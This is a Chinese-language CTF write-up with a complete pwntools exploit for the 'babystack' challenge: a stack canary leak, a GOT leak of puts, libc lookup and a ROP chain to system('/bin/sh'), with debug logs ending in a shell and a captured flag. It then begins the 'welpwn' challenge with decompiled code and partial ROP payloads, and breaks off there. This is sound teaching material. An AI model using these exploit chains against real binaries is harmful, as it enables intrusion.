
```python
from pwn import *
from LibcSearcher import LibcSearcher

se=lambda x:io.send(x)
sl=lambda x:io.sendline(x)
sa=lambda x,y:io.sendafter(x,y)
rv=lambda :io.recv()
sconnect=lambda :io.interactive()

IS_LOCAL = 0
context.log_level = "DEBUG"
pwn_file = './babystack'
elf = ELF(pwn_file)

if IS_LOCAL:
    io = process(pwn_file)
else:
    io = remote('111.200.241.244','57616')
#---------------------------------------------------------
#0x0000000000400a93 : pop rdi ; ret
pop_rdi_ret = 0x0000000000400a93
main_addr = 0x400908
payload1 = 'A'*0x88+'C'

'''
if IS_LOCAL:
    gdb.attach(io,"break *0x8048824\nc")
    pause()
'''
sa('>> ','1\n')
se(payload1)
sa('>> ','2\n')
io.recvuntil('C')
tmp = io.recv(7)
canary = u64('\x00' + tmp)
log.info("canary: 0x%x"%canary)
sa('>> ','1\n')
payload2 = 'A'*0x88+p64(canary)+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main_addr)
se(payload2)
sa('>> ','3\n')
puts_addr = u64(io.recvuntil('\n')[:-1].ljust(8,'\x00'))

if IS_LOCAL:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_base = puts_addr - libc.sym['puts']
    system_addr = libc_base + libc.sym['system']
    str_bin_sh = libc_base + next(libc.search('/bin/sh'))
else:
    libc=LibcSearcher('puts',puts_addr)
    libc_base = puts_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    str_bin_sh = libc_base + libc.dump('str_bin_sh')
'''
libc = ELF('./libc-2.23.so')
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
str_bin_sh = libc_base + next(libc.search('/bin/sh'))
'''

log.info('puts_addr: 0x%x'%puts_addr)
log.info('system_addr: 0x%x'%system_addr)
log.info('str_bin_sh: 0x%x'%str_bin_sh)

sa('>> ','1\n')
payload3 = 'A'*0x88+p64(canary)+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)
se(payload3)
sa('>> ','3\n')
sconnect()
```

最坑的是给出`./libc-2.23.so`找偏移打过去发现不对：

```text
[*] Switching to interactive mode
[DEBUG] Received 0x7 bytes:
'sh: 1: '
sh: 1: [DEBUG] Received 0x39 bytes:
'd: not found\n'
'--------\n'
'1.store\n'
'2.print\n'
'3.quit\n'
'--------\n'
'>> '
d: not found
```

后来还是用`LibcSearch`搞定：

```text
[DEBUG] Received 0x2d bytes:
'\n'
'--------\n'
'1.store\n'
'2.print\n'
'3.quit\n'
'--------\n'
'>> '
Multi Results:
0: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386)
1: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386)
2: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386)
3: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386)
4: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
Please supply more info using add_condition(leaked_func, leaked_address).
You can choose it by hand
Or type 'exit' to quit:4
[+] ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) be choosed.
[*] puts_addr: 0x7fcdf3827690
[*] system_addr: 0x7fcdf37fd390
[*] str_bin_sh: 0x7fcdf3944d57
[DEBUG] Sent 0x2 bytes:
'1\n'
[DEBUG] Sent 0xb0 bytes:
00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000080 41 41 41 41 41 41 41 41 00 c3 55 2b 79 4c 71 94  │AAAA│AAAA│··U+│yLq·│
00000090 ef be ad de 00 00 00 00 93 0a 40 00 00 00 00 00  │····│····│··@·│····│
000000a0 57 4d 94 f3 cd 7f 00 00 90 d3 7f f3 cd 7f 00 00  │WM··│····│····│····│
000000b0
[DEBUG] Received 0x1 bytes:
'\n'
[DEBUG] Received 0x2c bytes:
'--------\n'
'1.store\n'
'2.print\n'
'3.quit\n'
'--------\n'
'>> '
[DEBUG] Sent 0x2 bytes:
'3\n'
[*] Switching to interactive mode
$ cat flag
[DEBUG] Sent 0x9 bytes:
'cat flag\n'
[DEBUG] Received 0x2d bytes:
'cyberpeace{eeb2d8ed78aaaff3b53e9aaa357f3091}\n'
cyberpeace{eeb2d8ed78aaaff3b53e9aaa357f3091}
$
```

### welpwn

嗯这题也有点意思：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[1024]; // [rsp+0h] [rbp-400h] BYREF

  write(1, "Welcome to RCTF\n", 0x10uLL);
  fflush(_bss_start);
  read(0, buf, 1024uLL);
  echo(buf);
  return 0;
}
int __fastcall echo(__int64 buf)
{
  char input[16]; // [rsp+10h] [rbp-10h] BYREF

  for ( index = 0; *(index + buf); ++index )
    input[index] = *(index + buf); // may stack overflow
  input[index] = 0;
  if ( !strcmp("ROIS", input) )
  {
    printf("RCTF{Welcome}");
    puts(" is not flag");
  }
  return printf("%s", input);
}
```

可以看到被调用的函数将传入的参数直接拷贝在局部变量，由于传入的参数，被调用函数的变量都在栈上，所以栈的视图大概是：

```text
|var data abc|
|rbp|
|ret|
|argument data abc|
```

如果用传统的rop：

```python
payload = 'A'*0x18+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main_addr)
```

拷贝完栈中是这样：

```text
0x00007fffffffd950│+0x0010: 0x4141414141414141
0x00007fffffffd958│+0x0018: 0x4141414141414141
0x00007fffffffd960│+0x0020: 0x4141414141414141     ← $rbp
0x00007fffffffd968│+0x0028: 0x00000000004008a3  →  <__libc_csu_init+99> pop rdi
0x00007fffffffd970│+0x0030: 0x4141414141414141     ← $rsi, $rdi
0x00007fffffffd978│+0x0038: 0x4141414141414141
0x00007fffffffd980│+0x0040: 0x4141414141414141
0x00007fffffffd988│+0x0048: 0x00000000004008a3  →  <__libc_csu_init+99> pop r
```

要覆盖栈，所以需要padding（414141），但正因为有padding，所以必须要有gadget帮助跳过padding：

```python
payload = 'A'*0x18+p64(_3pop_ret)+p64(1)+p64(2)+p64(3)+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main_addr)
```
